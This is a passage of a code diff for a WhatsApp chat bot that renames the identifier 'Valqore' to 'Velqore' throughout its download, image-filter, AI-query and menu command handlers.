 ▢ *Extension:* ${ext}
 ▢ *Uploaded:* ${aploud}
 `.trim()
-    ValqoreInc.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
+    VelqoreInc.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
     }
     break
     case 'tagadmin': case 'listadmin': case 'admin':{
-    	if (!m.isGroup) return ValqoreStickGroup()
+    	if (!m.isGroup) return VelqoreStickGroup()
     const groupAdmins = participants.filter(p => p.admin)
     const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
     const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
@@ -6427,20 +6423,20 @@ ${translatedTafsirEnglish.text}`
 *Group Admins:*
 ${listAdmin}
 `.trim()
-    ValqoreInc.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
+    VelqoreInc.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
 }
 break
 case 'instagram': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
-	  if (!text) return replygcValqore(`You need to give the URL of Any Instagram video, post, reel, image`)
+	  if (!text) return replygcVelqore(`You need to give the URL of Any Instagram video, post, reel, image`)
   let res
   try {
     res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
   } catch (error) {
-    return replygcValqore(`An error occurred: ${error.message}`)
+    return replygcVelqore(`An error occurred: ${error.message}`)
   }
   let api_response = await res.json()
   if (!api_response || !api_response.data) {
-    return replygcValqore(`No video or image found or Invalid response from API.`)
+    return replygcVelqore(`No video or image found or Invalid response from API.`)
   }
   const mediaArray = api_response.data;
   for (const mediaData of mediaArray) {
@@ -6448,60 +6444,60 @@ case 'instagram': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
     const mediaURL = mediaData.url_download
     let cap = `HERE IS THE ${mediaType.toUpperCase()}`
     if (mediaType === 'video') {
-      ValqoreInc.sendMessage(m.chat, {video: {url: mediaURL}, caption: cap}, {quoted: m})
+      VelqoreInc.sendMessage(m.chat, {video: {url: mediaURL}, caption: cap}, {quoted: m})
     } else if (mediaType === 'image') {
-      ValqoreInc.sendMessage(m.chat, { image: {url: mediaURL}, caption: cap}, {quoted: m})
+      VelqoreInc.sendMessage(m.chat, { image: {url: mediaURL}, caption: cap}, {quoted: m})
     }
   }
 }
 break
 case 'apk':
 case 'apkdl':{
-if (!text) return replygcValqore("What apk u wanna download?")
-let resValqore = await fetch(`https://vihangayt.me/download/apk?id=${text}`)
-let jsonValqore = await resValqore.json()
-ValqoreInc.sendMessage(from, { document: { url: jsonValqore.data.dllink}, fileName : jsonValqore.data.name, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
+if (!text) return replygcVelqore("What apk u wanna download?")
+let resVelqore = await fetch(`https://vihangayt.me/download/apk?id=${text}`)
+let jsonVelqore = await resVelqore.json()
+VelqoreInc.sendMessage(from, { document: { url: jsonVelqore.data.dllink}, fileName : jsonVelqore.data.name, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
 .catch(console.error)
 }
 break
 case 'mathsai': {
-                if (!text) return replygcValqore('What is your question?')
+                if (!text) return replygcVelqore('What is your question?')
                 let d = await fetchJson(`https://vihangayt.me/tools/mathssolve?q=${text}`)                
-                replygcValqore(d.data)
+                replygcVelqore(d.data)
            }
             break
             case 'blackboxai': {
-                if (!text) return replygcValqore('What is your question?')
+                if (!text) return replygcVelqore('What is your question?')
                 let d = await fetchJson(`https://vihangayt.me/tools/blackboxv4?q=${text}`)                
-                replygcValqore(d.data)
+                replygcVelqore(d.data)
            }
             break
             case 'bardai': {
-                if (!text) return replygcValqore('What is your question?')
+                if (!text) return replygcVelqore('What is your question?')
                 let d = await fetchJson(`https://vihangayt.me/tools/bard?q=${text}`)                
-                replygcValqore(d.data)
+                replygcVelqore(d.data)
            }
             break
             case 'photoleapai': {
-	if (!text) return replygcValqore('What is your question?')
-	let Valqorefetch = await fetchJson(`https://vihangayt.me/tools/photoleap?q=${text}`)
-	ValqoreInc.sendMessage(from, { image: {url:Valqorefetch.data}}, { quoted: m })
+	if (!text) return replygcVelqore('What is your question?')
+	let Velqorefetch = await fetchJson(`https://vihangayt.me/tools/photoleap?q=${text}`)
+	VelqoreInc.sendMessage(from, { image: {url:Velqorefetch.data}}, { quoted: m })
 	}
 	break
 	case 'lamaai': {
-                if (!text) return replygcValqore('What is your question?')
+                if (!text) return replygcVelqore('What is your question?')
                 let d = await fetchJson(`https://vihangayt.me/tools/llama-2?q=${text}`)                
-                replygcValqore(d.data)
+                replygcVelqore(d.data)
            }
             break
             case 'geminiai': {
-                if (!text) return replygcValqore('What is your question?')
+                if (!text) return replygcVelqore('What is your question?')
                 let d = await fetchJson(`https://vihangayt.me/tools/gemini?q=${text}`)                
-                replygcValqore(d.data)
+                replygcVelqore(d.data)
            }
             break
 case 'itunes': {
-if (!text) return replygcValqore('Please provide a song name')
+if (!text) return replygcVelqore('Please provide a song name')
   try {
     let res = await fetch(`https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`)
     if (!res.ok) {
@@ -6521,9 +6517,9 @@ if (!text) return replygcValqore('Please provide a song name')
      • *URL:* ${json.url}`
     // Check if thumbnail is present, then send it with songInfo as caption
     if (json.thumbnail) {
-      await ValqoreInc.sendMessage(m.chat, {image: {url:json.thumbnail}, caption: songInfo}, {quoted: m}) 
+      await VelqoreInc.sendMessage(m.chat, {image: {url:json.thumbnail}, caption: songInfo}, {quoted: m}) 
     } else {
-      replygcValqore(songInfo)
+      replygcVelqore(songInfo)
     }
   } catch (error) {
     console.error(error)
@@ -6532,120 +6528,120 @@ if (!text) return replygcValqore('Please provide a song name')
 }
 break
 case 'ttp':
-if (args.length == 0) return reply(`Example: ${prefix + command} Valqore`)
-Valqoretks = args.join(" ")
-Valqorevuff = await getBuffer(`https://vihangayt.me/maker/text2img?q=${Valqoretks}`)
-ValqoreInc.sendImageAsSticker(m.chat, Valqorevuff, m, {
+if (args.length == 0) return reply(`Example: ${prefix + command} Velqore`)
+Velqoretks = args.join(" ")
+Velqorevuff = await getBuffer(`https://vihangayt.me/maker/text2img?q=${Velqoretks}`)
+VelqoreInc.sendImageAsSticker(m.chat, Velqorevuff, m, {
                         packname: packname,
                         author: author
                     })
 break
 case 'attp':
-if (args.length == 0) return reply(`Example: ${prefix + command} Valqore`)
-Valqoretks2 = args.join(" ")
-Valqorevuff2 = await getBuffer(`https://vihangayt.me/maker/text2gif?q=${Valqoretks2}`)
-ValqoreInc.sendImageAsSticker(m.chat, Valqorevuff2, m, {
+if (args.length == 0) return reply(`Example: ${prefix + command} Velqore`)
+Velqoretks2 = args.join(" ")
+Velqorevuff2 = await getBuffer(`https://vihangayt.me/maker/text2gif?q=${Velqoretks2}`)
+VelqoreInc.sendImageAsSticker(m.chat, Velqorevuff2, m, {
                         packname: packname,
                         author: author
                     })
 break
 case 'blur':
   case 'blurimg': {
- if (!isMedia) return replygcValqore("Where Is The Image")
-                let media = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
+ if (!isMedia) return replygcVelqore("Where Is The Image")
+                let media = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
                 let anu = await TelegraPh(media)
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     image: { url: `https://vihangayt.me/maker/blur?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
             break
             case 'beautiful':
   case 'beautifulimg': {
- if (!isMedia) return replygcValqore("Where Is The Image")
-                let media = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
+ if (!isMedia) return replygcVelqore("Where Is The Image")
+                let media = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
                 let anu = await TelegraPh(media)
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     image: { url: `https://vihangayt.me/maker/beautiful?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
             break
             case 'facepalm':
   case 'facepalmimage': {
- if (!isMedia) return replygcValqore("Where Is The Image")
-                let media = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
+ if (!isMedia) return replygcVelqore("Where Is The Image")
+                let media = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
                 let anu = await TelegraPh(media)
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     image: { url: `https://vihangayt.me/maker/facepalm?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
             break
             case 'invert':
   case 'invertimage': {
- if (!isMedia) return replygcValqore("Where Is The Image")
-                let media = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
+ if (!isMedia) return replygcVelqore("Where Is The Image")
+                let media = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
                 let anu = await TelegraPh(media)
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     image: { url: `https://vihangayt.me/maker/invert?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
             break
             case 'pixelate':
   case 'pixelateimage': {
- if (!isMedia) return replygcValqore("Where Is The Image")
-                let media = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
+ if (!isMedia) return replygcVelqore("Where Is The Image")
+                let media = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
                 let anu = await TelegraPh(media)
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     image: { url: `https://vihangayt.me/maker/pixelate?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
             break
             case 'rainbow':
   case 'rainbowimage': {
- if (!isMedia) return replygcValqore("Where Is The Image")
-                let media = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
+ if (!isMedia) return replygcVelqore("Where Is The Image")
+                let media = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
                 let anu = await TelegraPh(media)
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     image: { url: `https://vihangayt.me/maker/rainbow?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
             break
             case 'trigger':
   case 'triggerimage': {
- if (!isMedia) return replygcValqore("Where Is The Image")
-                let media = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
+ if (!isMedia) return replygcVelqore("Where Is The Image")
+                let media = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
                 let anu = await TelegraPh(media)
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     image: { url: `https://vihangayt.me/maker/trigger?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
             break
             case 'wanted':
   case 'wantedimage': {
- if (!isMedia) return replygcValqore("Where Is The Image")
-                let media = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
+ if (!isMedia) return replygcVelqore("Where Is The Image")
+                let media = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
                 let anu = await TelegraPh(media)
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     image: { url: `https://vihangayt.me/maker/wanted?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
             break
             case 'wasted':
   case 'wastedimage': {
- if (!isMedia) return replygcValqore("Where Is The Image")
-                let media = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
+ if (!isMedia) return replygcVelqore("Where Is The Image")
+                let media = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
                 let anu = await TelegraPh(media)
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     image: { url: `https://vihangayt.me/maker/wasted?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
             break
             case 'carbon':
   case 'carbonimage': {
- if (!text) return replygcValqore('Where is the text?')
-                ValqoreInc.sendMessage(m.chat, {
+ if (!text) return replygcVelqore('Where is the text?')
+                VelqoreInc.sendMessage(m.chat, {
                     image: { url: `https://vihangayt.me/maker/carbonimg?q=${text}` },caption: "Here you go!" }, { quoted: m}) }
             break
             case 'colorize': {
- if (!isMedia) return replygcValqore("Where Is The Image")
-                let media = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
+ if (!isMedia) return replygcVelqore("Where Is The Image")
+                let media = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
                 let anu = await TelegraPh(media)
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     image: { url: `https://vihangayt.me/tools/colorize?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
             break
             case 'enhance': {
- if (!isMedia) return replygcValqore("Where Is The Image")
-                let media = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
+ if (!isMedia) return replygcVelqore("Where Is The Image")
+                let media = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
                 let anu = await TelegraPh(media)
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     image: { url: `https://vihangayt.me/tools/enhance?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
             break
             case 'dehaze': {
- if (!isMedia) return replygcValqore("Where Is The Image")
-                let media = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
+ if (!isMedia) return replygcVelqore("Where Is The Image")
+                let media = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
                 let anu = await TelegraPh(media)
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     image: { url: `https://vihangayt.me/tools/dehaze?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
             break
            
@@ -6653,7 +6649,7 @@ case 'blur':
         case 'totalfitur': 
         case 'totalcmd': 
         case 'totalcommand': 
-            replygcValqore(`Total Features of ${botname} is ${Valqorefeature()}`)
+            replygcVelqore(`Total Features of ${botname} is ${Velqorefeature()}`)
         break
             case 'menu':
             case 'help': {
@@ -6665,7 +6661,7 @@ case 'blur':
             let xmenu_oh = `┌─❖
 │ Hi 👋 
 └┬❖  ${pushname} 
-┌┤✑  ${Valqoreytimewisher} 😄${readmore} 
+┌┤✑  ${Velqoreytimewisher} 😄${readmore} 
 │└────────────┈ ⳹
 │
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊 
@@ -6674,7 +6670,7 @@ case 'blur':
 │𝗕𝗼𝘁 : ${botname}
 │𝗢𝘄𝗻𝗲𝗿 𝗡𝗼: +${ownernumber}
 │𝗣𝗿𝗲𝗳𝗶𝘅 :  [ ${xprefix} ]
-│𝗠𝗼𝗱𝗲 : ${ValqoreInc.public ? 'Public' : `Self`}
+│𝗠𝗼𝗱𝗲 : ${VelqoreInc.public ? 'Public' : `Self`}
 │𝗛𝗼𝘀𝘁 𝗡𝗮𝗺𝗲 : ${os.hostname()}
 │𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
 │𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿 : ${Object.keys(global.db.data.users).length} User
@@ -6715,21 +6711,21 @@ case 'blur':
 │❏${xprefix}othermenu
 └─────────────────┈ ⳹`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -6739,22 +6735,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -6762,7 +6758,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -6780,7 +6776,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -6793,7 +6789,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -6803,8 +6799,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -6826,21 +6822,21 @@ break
             case 'allmenu': {
 let xmenu_oh = `Hi ${pushname}${readmore}\n\n${allmenu(prefix, hituet)}`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -6850,22 +6846,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -6873,7 +6869,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -6891,7 +6887,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -6904,7 +6900,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -6914,8 +6910,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -6937,21 +6933,21 @@ break
             case 'ownermenu': {
 let xmenu_oh = `Hi ${pushname}${readmore}\n\n${ownermenu(prefix, hituet)}`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -6961,22 +6957,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -6984,7 +6980,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -7002,7 +6998,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -7015,7 +7011,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -7025,8 +7021,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -7048,21 +7044,21 @@ break
 case 'othermenu': {
 let xmenu_oh = `Hi ${pushname}${readmore}\n\n${othermenu(prefix, hituet)}`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -7072,22 +7068,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -7095,7 +7091,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -7113,7 +7109,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -7126,7 +7122,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -7136,8 +7132,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -7159,21 +7155,21 @@ break
 case 'downloadmenu': {
 let xmenu_oh = `Hi ${pushname}${readmore}\n\n${downloadmenu(prefix, hituet)}`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
